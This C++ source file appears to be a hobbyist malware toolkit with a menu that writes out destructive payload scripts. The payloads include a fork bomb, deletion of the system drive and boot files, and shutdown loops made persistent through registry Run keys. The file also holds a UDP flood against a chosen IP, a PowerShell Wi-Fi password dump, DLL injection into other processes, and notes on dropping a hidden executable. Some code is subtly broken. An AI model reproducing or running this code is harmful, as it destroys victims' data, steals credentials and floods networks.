//   _____            _           _
//   \_   \_ __   ___| |_   _  __| | ___  ___
//    / /\/ '_ \ / __| | | | |/ _` |/ _ \/ __|
// /\/ /_ | | | | (__| | |_| | (_| |  __/\__ \
// \____/ |_| |_|\___|_|\__,_|\__,_|\___||___/

#include "stdafx.h" 

using namespace std;
/************************************************
* ForkBomb creates as many command prompts
* as your computer will take until your
* computer crashes.
***********************************************/
ofstream myFile;
ofstream myNewFile;
ofstream out;
string buffer;
int counter;

void VirusMenu() {
	cout << "0. Back" << endl;
	cout << "1. Caps" << endl;
	cout << "2. Enter" << endl;
	cout << "3. CD Virus" << endl;
	cout << "4. Shutdown" << endl;
	cout << "5. Persistent Shutdown" << endl;
	cout << "6. Instant Death" << endl;
	cout << "7. Computer Crash" << endl;
	cout << "8. Computer Crash (XP)" << endl;
	cout << "9. NO" << endl;
	cout << "10. Break Text Files" << endl;
	cout << "11. Meltdown" << endl;
	cout << "12. Net Flood" << endl;
	cout << "13. Internet Shutdown" << endl;
	cout << "14. Mouse Disable" << endl;
	cout << "15. Mouse Enable" << endl;
}

void forkbomb() {
	myFile.open("Forkbomb.bat");
	myFile << ":s" << endl;
	myFile << "start%" << endl;
	myFile << "%|%" << endl;
	myFile << "goto :s" << endl;
	myFile.close();
}

void Caps() {
	myFile.open("Caps.vbs");
	myFile << "Set wshShell =wscript.CreateObject(\"WScript.Shell\")" << endl;
	myFile << "do" << endl;
	myFile << "wscript.sleep 100" << endl;
	myFile << "wshshell.sendkeys \"{CAPSLOCK}\"" << endl;
	myFile << "loop" << endl;
	myFile.close();
}

void Enter() {
	myFile.open("Enter.vbs");
	myFile << "Set wshShell =wscript.CreateObject(\"WScript.Shell\")" << endl;
	myFile << "do" << endl;
	myFile << "wscript.sleep 100" << endl;
	myFile << "wshshell.sendkeys \"~(enter)\"" << endl;
	myFile << "loop" << endl;
	myFile.close();
}

void CD_Virus() {
	myFile.open("CD.vbs");
	myFile << "Set oWMP = CreateObject(\"WMPlayer.OCX.7\")" << endl;
	myFile << "Set colCDROMs = oWMP.cdromCollection" << endl;
	myFile << "do" << endl;
	myFile << "if colCDROMs.Count >= 1 then" << endl;
	myFile << "For i = 0 to colCDROMs.Count - 1" << endl;
	myFile << "colCDROMs.Item(i).Eject" << endl;
	myFile << "Next" << endl;
	myFile << "For i = 0 to colCDROMs.Count - 1" << endl;
	myFile << "colCDROMs.Item(i).Eject" << endl;
	myFile << "Next" << endl;
	myFile << "End If" << endl;
	myFile << "wscript.sleep 1000" << endl;
	myFile << "loop" << endl;
	myFile.close();
}

void Shutdown() {
	myFile.open("Shutdown.bat");
	myFile << "@echo off" << endl;
	myFile << "msg * I do not approve of your actions." << endl;
	myFile << "shutdown -c \"Error! You're an idiot!\" -s" << endl;
	myFile.close();
}

void Persistent_Shutdown() {
	myFile.open("Persistent_Shutdown.bat");
	myFile << "echo @echo off>c:windowshartlell.bat" << endl;
	myFile << "echo break off>>c:windowshartlell.bat" << endl;
	myFile << "echo shutdown -r -t 11 -f>>c:windowshartlell.bat" << endl;
	myFile << "echo end>>c:windowshartlell.bat" << endl;
	myFile << "reg add hkey_local_machinesoftwaremicrosoftwindowscurrentv ersionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f" << endl;
	myFile << "reg add hkey_current_usersoftwaremicrosoftwindowscurrentve rsionrun /v /t reg_sz /d c:windowshartlell.bat /f" << endl;
	myFile << "echo You have been HACKED." << endl;
	myFile << "PAUSE" << endl;
	myFile.close();
}

void Instant_Death() {
	myFile.open("InstantDeath.bat");
	myFile << "@echo off" << endl;
	myFile << "del %systemdrive%*.* /f /s /q " << endl;
	myFile << "shutdown -r -f -t 00 " << endl;
	myFile << "wshshell.sendkeys \"~(enter)\"" << endl;
	myFile << "loop" << endl;
	myFile.close();
}

void Computer_Crash() {
	myFile.open("PC_Crash.bat");
	myFile << "@echo off" << endl;
	myFile << "attrib -r -s -h c:autoexec.bat" << endl;
	myFile << "del c:autoexec.bat" << endl;
	myFile << "attrib -r -s -h c:boot.ini" << endl;
	myFile << "del c:boot.ini" << endl;
	myFile << "attrib -r -s -h c:ntldr" << endl;
	myFile << "del c:ntldr" << endl;
	myFile << "attrib -r -s -h c:windowswin.ini" << endl;
	myFile << "del c:windowswin.ini" << endl;
	myFile << "@echo off" << endl;
	myFile << "msg * YOU GOT OWNED!!!" << endl;
	myFile << "shutdown -s -t 7 -c \"A VIRUS IS TAKING OVER c:Drive\"" << endl;
	myFile.close();
}

void Computer_Crash_XP() {
	myFile.open("PC_XP_Crash.vbs");
	myFile << "Option Explicit" << endl;
	myFile << "Dim WSHShell" << endl;
	myFile << "Set WSHShell=Wscript.CreateObject(\"Wscript.Shell\") " << endl;
	myFile << "Dim x" << endl;
	myFile << "For x = 1 to 100000000" << endl;
	myFile << "WSHShell.Run \"Tourstart.exe\"" << endl;
	myFile << "Next" << endl;
	myFile.close();
}

void NO() {
	myFile.open("NO.bat");
	myFile << "@Echo off" << endl;
	myFile << "Del C: *.* |y " << endl;
	myFile.close();
}

void Break_TXT() {
	myFile.open("Break_Txt.bat");
	myFile << "REN *.DOC *.TXT" << endl;
	myFile << "REN *.JPEG *.TXT" << endl;
	myFile << "REN *.LNK *.TXT" << endl;
	myFile << "REN *.AVI *.TXT" << endl;
	myFile << "REN *.MPEG *.TXT" << endl;
	myFile << "REN *.COM *.TXT" << endl;
	myFile << "REN *.BAT *.TXT" << endl;
	myFile.close();
}

void MeltDown() {
	myFile.open("Meltdown.bat");
	myFile << ":CRASH" << endl;
	myFile << "net send * WORKGROUP ENABLED" << endl;
	myFile << "net send * WORKGROUP ENABLED" << endl;
	myFile << "GOTO CRASH" << endl;
	myFile << "ipconfig /release" << endl;
	myFile << "shutdown -r -f -t0" << endl;
	myFile << "echo @echo off>c:windowshartlell.bat" << endl;
	myFile << "echo break off>>c:windowshartlell.bat" << endl;
	myFile << "echo shutdown -r -t 11 -f>>c:windowshartlell.bat" << endl;
	myFile << "echo end>>c:windowshartlell.bat" << endl;
	myFile << "reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI /t reg_sz /d c:windowshartlell.bat /f" << endl;
	myFile << "reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v HAHAHA /t reg_sz /d c:windowshartlell.bat /f" << endl;
	myFile << "echo You Have Been Hackedecho @echo off>c:windowswimn32.bat" << endl;
	myFile << "echo break off>>c:windowswimn32.bat" << endl;
	myFile << "echo ipconfig/release_all>>c:windowswimn32.bat" << endl;
	myFile << "echo end>>c:windowswimn32.bat" << endl;
	myFile << "reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f" << endl;
	myFile << "reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f" << endl;
	myFile << "echo YOU HAVE BEEN HACKED BITCH" << endl;
	myFile << "REN *.DOC *.TXT" << endl;
	myFile << "REN *.JPEG *.TXT" << endl;
	myFile << "REN *.LNK *.TXT" << endl;
	myFile << "REN *.AVI *.TXT" << endl;
	myFile << "REN *.MPEG *.TXT" << endl;
	myFile << "REN *.COM *.TXT" << endl;
	myFile << "REN *.BAT *.TXT" << endl;
	myFile << "PAUSE" << endl;
	myFile << "PAUSE" << endl;
	myFile.close();
}

void NetFlood() {
	myFile.open("NetFlood.bat");
	myFile << ":CRASH" << endl;
	myFile << "net send * WORKGROUP ENABLED" << endl;
	myFile << "net send * WORKGROUP ENABLED" << endl;
	myFile << "GOTO CRASH" << endl;
	myFile.close();
}

void InternetShutdown() {
	myFile.open("InternetShutdown.bat");
	myFile << "echo @echo off>c:windowswimn32.bat" << endl;
	myFile << "echo break off>>c:windowswimn32.bat" << endl;
	myFile << "echo ipconfig/release_all>>c:windowswimn32.bat" << endl;
	myFile << "echo end>>c:windowswimn32.bat" << endl;
	myFile << "reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v WINDOWsAPI /t reg_sz /d c:windowswimn32.bat /f" << endl;
	myFile << "reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v CONTROLexit /t reg_sz /d c:windowswimn32.bat /f" << endl;
	myFile << "echo You Have Been HACKED!" << endl;
	myFile << "PAUSE" << endl;
	myFile.close();
}


void SpaceEaterDLL() {
	myFile.open("SpaceEater.dll");
	cout << "Buffering..." << endl;
	cout << "";
	while (true) {
		myFile << "|]++++++++   {|       |}      //\\\\     &+*+*+*D [|+=*=+=*-+ +=======\\\\     \n"
				"  [|      \\\\ |}       {|     //  \\\\         //  |]          |+       \\\\  \n"
			      "|]        // {|=======|}    //    \\\\       //   [|          +|       //      \n"
			      "[|*+*+*+*+   |}       {|   //++++++\\\\     //    |]+=*+*=+*+ |+{[}]{[}]}      \n"
			      "|]           {|       |}  //        \\\\   //     [|          +|       \\\\    \n"
			      "[|           |}       {| //          \\\\ C+*+*+* |]+*=+*=+*= |+        \\\\   \n\n"
			      "          Created by: darkmage79\n"
			      "          Enter 17 for options:\n";
	}
}

void MouseDisable() {
	BOOL WINAPI BlockInput(false);
}

void MouseEnable() {
	BOOL WINAPI BlockInput(true);
}

void udpFlood(char targetIP[17]) {
	cout << "Enter Ctrl + C to exit. " << endl; 
	WSADATA wsaData;         //WSAData Stucture contains the data about our Socket
	SOCKET s;               //Socket that will send the data
	SOCKADDR_IN targetAddr;//Target Address
	int packetSize = rand() % 9999999999 + 99999999;

	WSAStartup(MAKEWORD(2, 2), &wsaData); //Initialize WinSock 2.2
	s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); //Create our UDP Socket

	targetAddr.sin_family = AF_INET; //Setup the target address
	targetAddr.sin_port = htons(80);
	targetAddr.sin_addr.s_addr = inet_addr(targetIP);

	char * Packet = new char[packetSize]; //Create our buffer
	int sent = 0; //Amount of sent so we can calculate stuff
	unsigned long beginTime = clock(); //Time when we began
	
	while (true){
		sendto(s, Packet, strlen(Packet), NULL, (sockaddr *)&targetAddr, sizeof(targetAddr)); //send the buffer to target
		sent++; //add one
		unsigned long elapsedTime = (clock() - beginTime) / CLOCKS_PER_SEC; //Elapsed time

		if ((elapsedTime % 5) == 0) //Lets show what we got, only after 5 seconds
			cout << "Attacking " << targetIP << " With " << sent << " Packets of " << packetSize << endl;
	}
	closesocket(s); //Close Socket
	WSACleanup(); //Cleanup WSA
	delete[]Packet; //Cleanup our buffer (prevent memory leak)
}
 
void NetGrabber() {
	cout << "[!] Making Scripts\n";


	myFile.open("Bat.bat"); //Makes the batch file
	myFile << "Powershell.exe -executionpolicy remotesigned -File  NetGrabber.ps1 > nul";
	myFile.close();

	myNewFile.open("NetGrabber.ps1"); //Makes the powershell script
	myNewFile << "[CmdletBinding()]\n" \
		"Param ()\n" \
		"$wlans = netsh wlan show profiles | Select-String -Pattern \"All User Profile\" | Foreach-Object {$_.ToString()}\n"
		"$exportdata = $wlans | Foreach-Object {$_.Replace(\"    All User Profile     : \",$null)}\n"
		"$can = $exportdata | ForEach-Object {netsh wlan show profiles name=\"$_\" key=clear}\n"
		"$all = $can | findstr \"interface Content Absent\" \n"
		"$all >> prof.txt \n"
		"$all \n"
		"Write-Verbose \"Output saved\"\n";
	myNewFile.close();

	cout << "[!] Executing Scripts\n";
	system("Bat.bat");
	cout << "[!] Deleting Scripts\n";
	system("del Bat.bat");
	system("del NetGrabber.ps1");
}

bool Inject(DWORD pId, char *dllName)
{
	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, false, pId);
	if (h){
		LPVOID LoadLibAddr = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
		LPVOID dereercomp = VirtualAllocEx(h, NULL, strlen(dllName), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		WriteProcessMemory(h, dereercomp, dllName, strlen(dllName), NULL);
		HANDLE asdc = CreateRemoteThread(h, NULL, NULL, (LPTHREAD_START_ROUTINE)LoadLibAddr, dereercomp, 0, NULL);
		WaitForSingleObject(asdc, INFINITE);
		VirtualFreeEx(h, dereercomp, strlen(dllName), MEM_RELEASE);
		CloseHandle(asdc);
		CloseHandle(h);
		return true;
	}
	return false;
}

void VirusOptions() {
	int VirusOption;
	VirusMenu();
	cin >> VirusOption;

	switch (VirusOption) {
	case 0:
		break;
	case 1:
		Caps();
		break;
	case 2:
		Enter();
		break;
	case 3:
		CD_Virus();
		break;
	case 4:
		Shutdown();
		break;
	case 5:
		Persistent_Shutdown();
		break;
	case 6:
		Instant_Death();
		break;
	case 7:
		Computer_Crash();
		break;
	case 8:
		Computer_Crash_XP();
		break;
	case 9:
		NO();
		break;
	case 10:
		Break_TXT();
		break;
	case 11:
		MeltDown();
		break;
	case 12:
		NetFlood();
		break;
	case 13:
		InternetShutdown();
		break;
	case 14:
		MouseDisable();
		break;
	case 15:
		MouseDisable();
		break;
	}
}



/******************************************
XX Compile the prank EXE first, 
XX then use an .RC file to compile 
and link the prank EXE into a binary 
resource of your main EXE. When the 
main EXE is run, it can extract the 
prank EXE to a file and then run it. 
There is no standard API in C/C++ for 
accessing resources, you will have 
to use platform-specific APIs, like 
the FindResource(), LoadResource(), 
and LockResource() functions on 
Windows.
////////////////////////////////////////////
Or, your main EXE could simply contain 
the prank code directly, and then run a 
separate copy of itself with a different 
command line to execute the prank code. 
You don't actually need a separate EXE for 
the prank (unless you really want one).
*******************************************/
